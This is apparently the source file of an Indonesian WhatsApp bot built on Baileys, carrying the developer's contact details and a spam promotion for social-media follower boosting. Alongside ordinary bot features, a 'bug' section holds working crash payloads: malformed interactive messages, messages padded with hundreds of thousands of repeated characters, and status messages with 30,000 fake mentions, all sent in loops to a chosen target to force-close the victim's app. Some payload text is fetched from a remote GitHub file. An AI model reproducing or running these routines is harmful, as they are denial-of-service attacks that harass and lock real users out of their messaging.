/*
 
# Note:Jangan Hapus Credits Developer Script Ini ngehapus Credit? Gw Doain Sc Nya Eror

Developer: dwiaff
Nomor Wa:6282178006414
Telegram:T.me/nabzxstore


*/


process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('node-yt-dl');
const speed = require('performance-now');
const moment = require('moment-timezone');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const path = require('path');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { OrderKuota } = require("./lib/orderkuota")
const orderkuota = new OrderKuota()
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
const { LoadDataBase } = require('./src/message');
const { TelegraPh, UguuSe } = require('./lib/uploader');
const { toAudio, toPTT, toVideo } = require('./lib/converter');
const { imageToWebp, videoToWebp, writeExif } = require('./lib/exif');
const { chatGpt, tiktokDl, facebookDl, instaDl, instaDownload, instaStory, ytMp4, ytMp3, allDl, Ytdl } = require('./lib/screaper');
const { handleOrderNokos } = require("./lib/ordernokos");
const virtu = require("./lib/virtusim");
const JsConfuser = require("js-confuser");
const { pinterest, pinterest2, wallpaper, wikimedia, quotesAnime, umma, ringtone, styletext, ssweb, igstalk, tts, mediafire } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, toIDR, getTypeUrlMedia, pickRandom } = require('./lib/function');
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const uploadImage = require('./lib/uploadImage')
global.lastPmTarget = null
module.exports = dwiaff = async (dwiaff, m, chatUpdate, store) => {
	try {
await LoadDataBase(dwiaff, m)
const botNumber = await dwiaff.decodeJid(dwiaff.user.id)
// === ✅ AUTO-FORWARD JAWABAN DARI TARGET ===
if (!m.key.fromMe && m.chat === global.lastPmTarget) {

    const ownerJid = "6289506747054@s.whatsapp.net" // GANTI dengan nomormu

    let pesan = ""

    if (m.message.conversation) {

        pesan = m.message.conversation

    } else if (m.message.extendedTextMessage?.text) {

        pesan = m.message.extendedTextMessage.text

    } else {

        pesan = "[pesan bukan teks]"

    }

    await dwiaff.sendMessage(ownerJid, {

        text: `📩 *Balasan dari ${m.pushName || m.chat.replace("@s.whatsapp.net", "")}:*\n\n${pesan}`

    })

}






const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? om.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = "."
const isCmd = body && typeof body === "string" && body.startsWith(prefix);
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const from = m.key.remoteJid
const args = (body && typeof body === 'string') ? body.trim().split(/ +/).slice(1) : [];
const getQuoted = (m.quoted || m)
const isCreator = isOwner = owners.includes(m.sender) ? true : [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) ? true : false
const sender = m.key.fromMe ? (dwiaff.user.id.split(':')[0]+'@s.whatsapp.net' || dwiaff.user.id) : (m.key.participant || m.key.remoteJid)
const autodelete = from && isCmd ? antidel.includes(from) : false 
const moment = require('moment-timezone');
// Daftar URL gambar yang akan dipilih secara acak
const imageList = [
    'https://files.catbox.moe/czfptj.jpg',
    'https://files.catbox.moe/fq5gd6.jpg',
];

// Pilih gambar secara acak dari array
const randomImage = imageList[Math.floor(Math.random() * imageList.length)];

const UrlList = [
    'https://g.top4top.io/m_3340lvb210.mp4',
    'https://h.top4top.io/m_3340w5toh1.mp4',
    'https://i.top4top.io/m_3340i1h3h2.mp4',
    'https://k.top4top.io/m_3340tqk6g4.mp4', 
    'https://j.top4top.io/m_3340izsxc3.mp4'
];

const randomUrl = UrlList[Math.floor(Math.random() * UrlList.length)];

const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
var crypto = require("crypto")
const quoted = getQuoted 
    ? (getQuoted.type === 'buttonsMessage' && Object.keys(getQuoted).length > 1) 
        ? getQuoted[Object.keys(getQuoted)[1]] 
        : (getQuoted.type === 'templateMessage' && getQuoted.hydratedTemplate && Object.keys(getQuoted.hydratedTemplate).length > 1) 
            ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] 
            : (getQuoted.type === 'product' && Object.keys(getQuoted).length > 0) 
                ? getQuoted[Object.keys(getQuoted)[0]] 
                : m.quoted 
                    ? m.quoted 
                    : m
    : m.quoted 
        ? m.quoted 
        : m;
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const reseller = JSON.parse(fs.readFileSync("./database/reseller.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const { ytdl } = require('./lib/scrape-ytdl');
const isReseller = reseller.includes(m.sender)
const isPremium = premium.includes(m.sender)
const func = require('./dwiaffD/utils.js')
///============== [ MESSAGE ] ================
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return;

if (isCmd && !m.isBaileys) {
    let chatType = m.isGroup ? "Group Chat" : m.isChannel ? "Channel Chat" : "Private Chat";
    console.log(
        chalk.black.bgWhite('[ Command ]:'), chalk.white.bold(prefix + command) + '\n' +
        chalk.black.bgWhite('[ Sender ]:'), chalk.white.bold(m.sender) + '\n' +
        chalk.black.bgWhite('[ Type Chat ]:'), chalk.white.bold(chatType) + '\n\n'
    );
}

//============= [ FAKEQUOTED ] ===============
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": "Powered By ᴅᴡɪᴀғғ"}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered By dwiaff`,jpegThumbnail: ""}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered By ᴅᴡɪᴀғғ`,jpegThumbnail: ""}}}
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `Payment By dwiaff`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By dwiaff`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `Powered By ᴅᴡɪᴀғғ`,jpegThumbnail: ""}}}

var ppuser
try {
ppuser = await dwiaff.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://img101.pixhost.to/images/314/550520829_media.jpg' 
}

if (autodelete) {
dwiaff.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.key.id,
participant: m.key.participant
}
})
}

//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat]?.simi === true && !isCmd) {
    try {
        // Kirim permintaan ke API OpenAI
        const res = await axios.get(`https://nabzxbotz.biz.id/ai/openai?apikey=${global.apibotnabzx}&text=${encodeURIComponent(m.text)}`);
        
        // Periksa respons API
        if (res.data.status && res.data.result?.message) {
            await m.reply(res.data.result.message); // Balas pesan AI
        }
    } catch (error) {
        console.error("Error while fetching AI response:", error.message);
    }
}
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await dwiaff.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await dwiaff.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna sudah melanggar peraturan yang ada di dalam grup ini/`, mentions: [m.sender]}, {quoted: m})
await dwiaff.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await dwiaff.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await dwiaff.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await dwiaff.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karena admin melarang untuk share link grup di dalam grup ini`, mentions: [m.sender]}, {quoted: m})
await dwiaff.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await dwiaff.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}
//============ [ EVENT CONTROL ] =============

if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await dwiaff.sendMessage(m.chat, {text: `
*dwiaff Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/H2mZ8aBCfIP2wELyT7ils8
* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vaiz6CQ7oQha5Al83B3e

*👤 Contact dwiaff*
* *WhatsApp Utama :*
+6285783089587
* *Whatsapp cadangan :*
+6282178006414
https://t.me/nabzxstore 
`}, {quoted: null})
}
}

dwiaff.autoshalat = dwiaff.autoshalat ? dwiaff.autoshalat : {}
let id = m.chat 
if (id in dwiaff.autoshalat) {
return false
}
let jadwalSholat = { shubuh: '04:29', terbit: '05:44', dhuha: '06:02', dzuhur: '12:02', ashar: '14:49', magrib: '17:52', isya: '19:01' }
const datek = new Date((new Date).toLocaleString("en-US", {timeZone: "Asia/Jakarta"}))
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu && m.isGroup) {
let caption = `
Hai!, kini waktu *${sholat}* telah tiba...\nAmbilah air dan segeralah sholat 😇\n\n*${waktu}*\n_tuk wilayah Bandung dan sekitarnya_`
dwiaff.autoshalat[id] = [
await dwiaff.sendMessage(m.chat, {text: caption, mentions: [], contextInfo: { isForwarded: true, forwardingScore: 9999, mentionedJid: [], forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idChannel }}}, {quoted: m}),
setTimeout(async () => {
delete dwiaff.autoshalat[m.chat]
}, 50000)]
}}
    


//============== [ FUNCTION ] ================
var example = (teks) => {
return `\n</> *❌ Bᴜᴋᴀɴ Bᴇɢɪᴛᴜ* :\n Kᴇᴛɪᴋ *${prefix+command}* ${teks}\n`
}

async function remini(kyoko, tysa) {
  return new Promise(async (majeed, tamicko) => {
    const deamber = joaniel;
    let milahn = [deamber(153), "recolor", "dehaze"];
    milahn.includes(tysa) ? tysa = tysa : tysa = milahn[0];
    let kymire, nazar = new FormData, lennel = deamber(149) + "://" + deamber(128) + deamber(151) + deamber(142) + tysa;
    nazar[deamber(146)](deamber(136), 1, {"Content-Transfer-Encoding": "binary", contentType: "multipart/form-data; charset=uttf-8"}), nazar[deamber(146)](deamber(150), Buffer[deamber(144)](kyoko), {filename: deamber(143), contentType: deamber(152)}), nazar[deamber(148)]({url: lennel, host: deamber(128) + deamber(151) + ".ai", path: "/" + tysa, protocol: "https:", headers: {"User-Agent": deamber(141), Connection: deamber(127), "Accept-Encoding": "gzip"}}, function (suha, deantoine) {
      const lakeysia = deamber;
      if (suha) tamicko();
      let zyan = [];
      deantoine.on(lakeysia(135), function (spicie, ebunoluwa) {
        const bellaluna = lakeysia;
        zyan[bellaluna(129)](spicie);
      }).on("end", () => {
        const camden = lakeysia;
        majeed(Buffer[camden(132)](zyan));
      }), deantoine.on(lakeysia(139), shady => {
        tamicko();
      });
    });
  });
}
// Function to generate a random password
function generateRandomPassword(length = 12) {
 const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 let password = "";
 for (let i = 0; i < length; i++) {
 const randomIndex = Math.floor(Math.random() * charset.length);
 password += charset[randomIndex];
 }
 return password;
}

// Define the generateRandomNumber function
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const CHANNELS_FILE = "./dwiaffD/savesaluran.json";

// Fungsi untuk memuat data saluran dari file
function loadChannels() {
    if (fs.existsSync(CHANNELS_FILE)) {
        return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
    }
    return [];
}

function saveChannels(data) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}

global.channels = loadChannels();

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

//============= [ CONST BUG ] ===============

const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ᴅᴡɪᴀғғ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"ᴅᴡɪ\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ ᴅᴡɪᴀғғᴄʀᴀsʜ ⿻ ʙᴀɴᴛᴀɪ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
		
//============= [ FUNC BUG ] ===============
let apiClient;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}





// function bug
async function GxhorseForceClose(target) {
for (let r = 0; r < 666; r++) {  
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "ᴋᴀsɪᴀɴ ᴅɪ ʙᴜɢ sᴀᴍᴀ ʙᴀɴɢ ɴᴀʙ ɴᴀʙ",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "Kontol",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "t.me/Fya_zuroku",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "ᴅᴡɪᴀғғ Kill",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Zuroku - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  await dwiaff.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
await sleep(5000) // memberikan efek jeda selama 5 detik
console.log("저스틴𝔲𝔦 𝔖𝔶𝔰𝔱𝔢𝔪𝔞𝔱𝔦𝔠巛⚰︎⃟⃟🩸")
}
}

async function PukiMay(target) {
  try {
    let pesan = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: " んすぐに助けてくださいメタシステムさんありがとうございま"
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "null",
                header: " んすぐに助けてくださいメタシステムさんありがとうございま",
                body: ""
              }),
              buttons: []
            },
            contextInfo: {
              mentionedJid: [target],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    }, {
      quoted: hah
    });
    await dwiaff.relayMessage(target, pesan.message, jids ? {
      participant: {
        jid: target,
        messageId: pesan.key.id
      }
    } : {});
    console.log(chalk.blue(" success send bug "));
    
    // Tambahkan kode iOs Old
    await dwiaff.relayMessage(target, {
      "paymentInviteMessage": {
        serviceType: "FBPAY",
        expiryTimestamp: Date.now() + 1814400000
      }
    }, {
      participant: {
        jid: target
      }
    });
    
    // Tambahkan kode Call Old
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {},
              hasMediaAttachment: true
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              name: "call_permission_request",
              messageParamsJson: ""
            },
            carouselMessage: {}
          }
        }
      }
    }), {
      userJid: target,
      quoted: hah
    });
    await dwiaff.relayMessage(target, etc.message, {
      participant: {
        jid: target
      }
    });
    
    // Tambahkan kode iOs New
    await dwiaff.relayMessage(target, {
      'extendedTextMessage': {
        'text': '.',
        'contextInfo': {
          'stanzaId': target,
          'participant': target,
          'quotedMessage': {
            'conversation': '  バ GalaXyy Crashh グ ' + 'ꦾ'.repeat(50000)
          },
          'disappearingMode': {
            'initiator': "CHANGED_IN_CHAT",
            'trigger': "CHAT_SETTING"
          }
        },
        'inviteLinkGroupTypeV2': "DEFAULT"
      }
    }, {
      'participant': {
        'jid': target
      }
    }, {
      'messageId': null
    });
    
    // Tambahkan kode FlowX
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " んすぐに助けてくださいメタシステムさんありがとうございま",
              hasMediaAttachment: false,
            },
            body: {
              text: " んすぐに助けてくださいメタシステムさんありがとうございま",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          }
        }
      }
    }, {});
    await dwiaff.relayMessage(target, msg.message, {
      participant: {
        jid: target
      }
    });
  } catch (error) {
    console.error('Error:', error);
  }
}

async function SpaceGroup(target) {
if (!target.includes("@s.whatsapp.net") && !target.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", target);
return;
}

let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "ᴅᴡɪᴀғғ ᴠ3",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
},
},
},
};
for (let i = 0; i < 10; i++) {  
try {
await dwiaff.relayMessage(target, Msg, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break; 
}
}
}



// FC COMBO
async function ForceCloseUiX(target) {
for (let i = 0; i < 10; i++) {
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
}
}







// function racikan AlwaysZuroku
async function OverflowPayload(target, mention = false, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await dwiaff.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await dwiaff.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "Nab" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar target
        await new Promise(res => setTimeout(res, delayMs));
    }
}
	
async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await dwiaff.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await dwiaff.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  𝗦𝗔𝗛𝗥𝗜𝗟 - 𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝟰\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
